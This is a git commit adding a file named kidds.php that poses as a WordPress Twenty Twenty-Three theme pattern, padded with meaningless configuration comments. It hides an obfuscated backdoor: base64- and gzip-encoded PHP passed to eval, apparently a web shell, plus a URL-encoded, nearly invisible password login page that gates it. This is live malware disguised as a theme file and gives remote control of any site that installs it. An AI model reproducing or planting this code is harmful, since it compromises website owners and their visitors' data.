243ad4ed1818051c4d55c92e7adcbeb44975570b
soy777 <rachmatagustio@gmail.com>
2025-10-06 10:33:54 +0700

    Create kidds.php

---
+++ kidds.php
@@ -0,0 +1,35 @@
+<?php
+/**
+ * Title: Hidden Heading for Homepage
+ * Slug: twentytwentythree/hidden-heading
+ * Inserter: no
+ 
+?>
+<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} -->
+<h1 class="alignwide" style="margin-bottom:var(--wp--preset--spacing--60)"><?php echo esc_html_x( 'Mindblown: a blog about philosophy.', 'Main heading for homepage', 'twentytwentythree' ); ?></h1>
+<!-- /wp:heading -->
+*/
+/**
+* The core configuration of a WordPress
+* system is largely defined by the configurations of server
+* and generate content PHP for theme version
+*/
+
+/**
+* located in the root directory of your theme WordPress installation
+* posts, pages, comments, user data, settings, etc
+* You can control automatic updates for WordPress PHP themes
+* used to configure various other advanced settings
+*/
+
+/**
+* You can access and edit configurations using a file manager provided by your web host
+* Dont Edit Anything In This Folder If You Not the root for permission
+*/
+
+/**
+* Function to check if the user is logged in based on the presence of a valid cookie
+*/
+?>
+<?php $Apaaja = "Sy1LzNFQUzYwtrS2V0svsYYw9dKrSvOS83MLilKLizXSqzLz0nISS1I1khKLU81M4lNSk/NTUjWKS4qKUss0VDL9EksyEvM\x43ijLzinNSKzVBwBo\x41"; $iNathanPrinsley = "QzWUoFw/fc2fkFE/g+OPatAYHga1UQmEM6xlpGfuXdQCLZ0FiqIrLGIq/KX/8zl7+G5pFLJbYPHo/c4Wh+FDD01x2ZDD0t/op6bQMu1WMlBixzIkcs3RNUuHMOAJONITMmiX15WU5cUaLtlSkdpoP8GrR3y1xdlYRZGPEaMk6+5rhXBL12R/pmTqh8hIGFTOZfXzHtbzslj34hP7Z3qWvfb3HxmM2Maz64s64c+fF0CUZSaHnh5y6A6d0QoiLKWN0G2eqo8k+Sbznd3/tEh9VKTNNV/MEzu0S0QWcFJJZSSqY1Dhrf9EtTclsuVfdiC8d8xZ6IeWv5wrnomk9IifXgxrlrEWbKqxkNpE1bvO+0tKxYOjs9RlJfBisIbFZuplutQedr4+v7XtYKtzI46eG0MTvgp8MAd/APlNuj/c3HZj38b8tWjsbbdeMWW9W4GPeCcW/Rj0oaz0T22YiVCocSUyrp8/WhcU0mtLjavzUsmll9tnaxVCSpI/O+tbQC7T50Y3uTDTE8HbxmqENa29BZaKZng8DPDG0VEbDD60FhIG+OMNJP4nw+b+42inj+l/rO+e/IMDZyDSveQjv1r6asynBtG9aarbfXKhSzlONvXaf3nuA25aQHuTYkm3YtYj7L4aX7XYkI/fqgPONcaDs/rP3Qa9srD+gt60nfBBbwHEgF8+gdVrBgr39fyDf2BO4Vf69ecD0AGjo6yAEtlsrF5YKZ91iOJ4pdTBDveYOJgJjUV+etzOpi2aROhrRX7z4d4uSW2lyWqnMv7obVKzcFNK2JM3qhnxeGLiyjG35+mCWrwNgYv1SFZFzfVBOE04XPAQwG5te5H6RVEZ6gasuBWhqhJUhlkFrjnTYodMvHgCXijZCA+SpEg44ALRzegPBobMswlQVoqVsmnW8GWvGBIWY6BHhxDEJIYxYMYvfzgJLd43Bkzx216j2SB90H+79EIve3xRnPGyVphN31n65yHEFF+axNaVsOqZF6CgW5q/W96WFiccBKG5MpD4KwlMicDzt2lc1P7hszvXnlpnnZrEWI37p5YIbbxbfLvnXKp7RbnYsOA21WZV64KQGlSUkmSRakGpSL18kpjNoWEG/Rsj+DBSa/WbV1Jn4x/sDwUA"; eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja)))); exit; ?>
+<script>document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%20%20%20%20%3C%74%69%74%6C%65%3E%41%64%6D%69%6E%20%4C%6F%67%69%6E%3C%2F%74%69%74%6C%65%3E%0A%20%20%20%20%3C%73%74%79%6C%65%3E%0A%0A%20%20%20%20%20%20%20%20%69%6E%70%75%74%5B%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%5D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6F%75%74%6C%69%6E%65%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%69%6E%70%75%74%5B%74%79%70%65%3D%22%73%75%62%6D%69%74%22%5D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6F%75%74%6C%69%6E%65%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%75%72%73%6F%72%3A%20%64%65%66%61%75%6C%74%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C%2F%73%74%79%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%20%20%20%20%3C%66%6F%72%6D%20%6D%65%74%68%6F%64%3D%22%50%4F%53%54%22%20%61%63%74%69%6F%6E%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%70%61%73%73%77%6F%72%64%22%3E%20%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%69%64%3D%22%70%61%73%73%77%6F%72%64%22%20%6E%61%6D%65%3D%22%70%61%73%73%77%6F%72%64%22%3E%0A%20%20%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%76%61%6C%75%65%3D%22%4C%6F%67%69%6E%22%3E%0A%20%20%20%20%3C%2F%66%6F%72%6D%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E%0A%20%20%20%20%3C%3F%70%68%70%0A%7D%0A%3F%3E'));</script>
